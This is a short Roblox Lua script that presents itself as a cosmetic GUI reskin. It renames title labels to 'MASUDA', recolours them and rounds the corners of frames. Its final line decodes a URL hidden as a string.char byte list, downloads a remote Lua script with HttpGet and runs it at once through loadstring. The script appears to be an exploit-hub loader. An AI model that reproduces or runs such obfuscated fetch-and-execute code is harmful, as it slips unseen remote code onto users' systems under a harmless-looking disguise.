
--[[ STAGE 2: VISUAL CORE ]]
local HubName = "MASUDA"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            -- 1. ЗАГОЛОВКИ (Smart Filter)
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            
            -- 2. СКРУГЛЕНИЯ (Modern UI)
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end
    
    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then task.delay(0.1, function() Customize(c) end) end
    end)
end

Hook()
loadstring(game:HttpGet(string.char(104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 106, 110, 107, 105, 101, 46, 99, 111, 109, 47, 97, 112, 105, 47, 118, 49, 47, 108, 117, 97, 115, 99, 114, 105, 112, 116, 115, 47, 112, 117, 98, 108, 105, 99, 47, 51, 97, 48, 52, 52, 101, 52, 55, 97, 51, 101, 53, 53, 99, 55, 51, 54, 51, 99, 54, 51, 50, 101, 53, 55, 48, 102, 50, 53, 55, 49, 51, 52, 57, 99, 57, 55, 102, 98, 97, 101, 99, 100, 50, 53, 100, 51, 57, 57, 99, 102, 57, 55, 54, 102, 99, 49, 50, 102, 48, 54, 51, 100, 54, 47, 100, 111, 119, 110, 108, 111, 97, 100)))()
